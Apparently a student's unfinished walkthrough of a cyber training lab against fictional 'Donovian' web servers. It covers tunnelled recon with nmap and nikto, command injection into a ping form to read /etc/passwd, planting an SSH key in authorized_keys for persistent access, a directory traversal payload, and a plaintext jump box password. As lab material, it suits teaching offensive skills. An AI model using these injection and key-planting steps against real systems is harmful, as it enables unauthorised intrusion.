Exercise's Scheme of Maneuver:
```
>Jump Box: 10.50.37.98
>pass: v0cEcUbwIzY878p
->T1:10.100.28.48
-->T2: 10.100.28.55
```
---------------------------------------------------------------------------------
```
T1
Hostname: Donovian_MI_websvr
IP: 10.100.28.40
PORTS: 80(http),4444(ssh)
OS: ??
Creds:unknown
Last Known SSH Port: ??
PSP: Unknown
Malware: Unknown
Action: Conduct approved Web Exploitation techniques to collect intellegence.

T2
Hostname: Donovian_Training_Websvr
IP: 10.100.28.XX
PORTS: 
OS: ??
Creds:unknown
Last Known SSH Port: ??
PSP: Unknown
Malware: Unknown
Action: Conduct approved Web Exploitation techniques to collect intellegence.
```
---------------------------------------------------------------------------------



# Passive Recon:

On lin-ops:

```
Prerequisites:
---------------------------------------------
	* if no socket file then, make one.  	 
ssh -MS /tmp/jump student@JumpBox	     	 
	    				 			     					 
	* if no dynamic port, make one.      	 
ssh -S /tmp/jump jump -O forward -D 9050     
---------------------------------------------
```
After getting the dynamic tunnel running, you will conduct your passive enumeration on the specified target.

```
proxychains nmap 10.100.28.48
proxychains nmap -Pn -n -T5 10.100.28.48
proxychains nc 10.100.28.40 80
proxychains nc 10.100.28.40 4444
proxychains nmap --script http-enum 10.100.28.XX
```

When looking at the nmap script 'http-enum' you are looking for the following results:

- Valid HTTP ports.
- Directories within the Web Server
- "robots.txt" file.

```
Host is up (0.00042s latency).
Not shown: 998 closed ports
PORT     STATE SERVICE
80/tcp   open  http
|   http-enum: 
|   /robots.txt: Robots file
|   /css/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
|   /images/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
|_  /uploads/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
4444/tcp open  krb524

Nmap done: 1 IP address (1 host up) scanned in 3.61 seconds
```

Make sure to utilize the nikto tool. It will show you any directories that a crawlers are unable to enumerate.

```
proxychains nikto v -h 10.100.28.XX
```
Compare your results from nikto scan against your nmap scans. This will give you a good idea of what could be on the Web Server. 

```
----------------------------------------
From nmap scans:  		| From nikto scans:	
----------------------------------------
/robots.txt			| /icons/README		
/css				| /net_test			
/images				|					
/uploads			|					
----------------------------------------			
```

# Active Recon:

Upon completion of your Passive Reconnisance you will leverage your existing Socket file and add a port forward:

```
ssh -S /tmp/jump jump -O forward -L 1111:10.100.28.40:80
```
After validating that the port forward works. You will proceed to open a firefox web-browser on your lin-ops station.
```
firefox
```
On the firefox browser, navigate to the target device via the Port Forward you added to you Socket File.

```
127.0.0.1:1111
```

Now that you have accessed the device from the internet, visit the various directories that were previously enumerated.

```
http://127.0.0.1:1111/robots.txt
http://127.0.0.1:1111/css
http://127.0.0.1:1111/images
http://127.0.0.1:1111/uploads
http://127.0.0.1:1111/net_test

```

Look through the directories for items of interest such as:

- Hidden Directories:
```
User-agent: *
Disallow: /net_test	
```

- OS Versions:
```
Index of /uploads
[ICO]	Name	Last modified	Size	Description
[PARENTDIR]	Parent Directory	 	- 	 
[ ]	message	2022-04-19 20:18 	229 	 
Apache/2.4.29 (Ubuntu) Server at 127.0.0.1 Port 1111
```

- Other IP Addresses:
```
Just completed my Cyber Awareness training and it says ATOPIA. Last I checked that is a whole other country.
Please send me a corrected cert with the right now.

I took my online training from the following website

10.100.28.55
```

- Vulnerable areas for:
	- Command Injection
	- Directory Traverasal 
	- Malicious File Upload
```
Index of /net_test
[ICO]	Name	Last modified	Size	Description
[PARENTDIR]	Parent Directory	 	- 	 
[ ]	industry_check.php	2022-03-23 14:33 	1.5K	 
Apache/2.4.29 (Ubuntu) Server at 127.0.0.1 Port 1111	
```	

The web-page that the '/new_test directory' resides on is vulnerable:

```
	System to ping:
	Path to test:
	Port to check:
```

Test the various fields and see what vulnerabilities you can exploit. 


## Command Injection:

After verifying that Command Injection is possible try the following:
	
	* Enumerating /etc/passwd in all the fields provided above

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/bin/bash
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
mysql:x:111:116:MySQL Server,,,:/nonexistent:/bin/false
billybob:x:1001:1001:Possible Flag Here:/home/billybob:/bin/bash	

```
Next lets see who we are logged in as.

	* User is billybob
billybob:x:1001:1001:Possible Flag Here:/home/billybob:/bin/bash

After you determine who the User is and their home directory, check to see if they have a .ssh directory.

If not, make one:
```
; mkdir /home/billybob/.ssh
```

Verify it was created:
```
; ls -la /home/billybob
```

## Malicious File Upload

Get your public key.
```
ssh-keygen
ls -l /home/student/.ssh
cat /home/student/.ssh/id_rsa.pub
```
Copy that key over to billybob's directory "/home/billybob/.ssh/authorized_keys"
```
; echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDaf56Lv5nrgWiIKbzhHLOiqyog8ATYemjQAFZYDA4sGfbVofZR+wOeoazbV3xCW9zQdqYpUZHUvpuIDVhNfc4RuLOurS+kddlJ8lJeh/GWarckQfksCpCtEV9Cd4LFIUsWpbPXF1v68RJY+kE5IP84B6+aM+2gwfSULR9rpSWV+P2npvRV3zmeGCevJqT57sMfKitI6lNpYRVFF6VAl+g4LEtQ2ac1VwfYZl//FTYwpUNS24M6o0quG1L80YD88+p0XwEN+SDifd0Qrx5GIf+yOrEcu75EIg6KLko042f9vIb35XL5AnW5nIu9xNJZcj4OoLX3Ppht3Rja27zRg39n student@lin-ops" >> /home/billybob/.ssh/authorized_keys
```

---------------------------------------------------------------------------------


Create a new Master Socket file and add a Port Forward through it to the Target 1 device.
```
ssh -MS /tmp/web web student@10.50.37.98
ssh -S /tmp/web web -O forward -L 2222:10.100.28.40:4444
```

Test the forward. 
```
ssh billybob@127.0.0.1 -p 2222
```

Cancel the first Dynamic Tunnel and create a new one.
```
ssh -S /tmp/jump jump -O cancel -D9050
ssh -S /tmp/web web -O forward -D9050
```

Make a master socket, and ssh into the web server. Log On sending your private key to encrypt the begging of the conversation. This allows the client to authenticate.
```
ssh -i .ssh/id_rsa -MS /tmp/web billybob@127.0.0.1 -p 1111
```

Congrats, you did a ssh  masquerade


## Directory Traversal: via HTTP POST/GET methods
```
../../../../../etc/passwd
```
# Finish this later.....
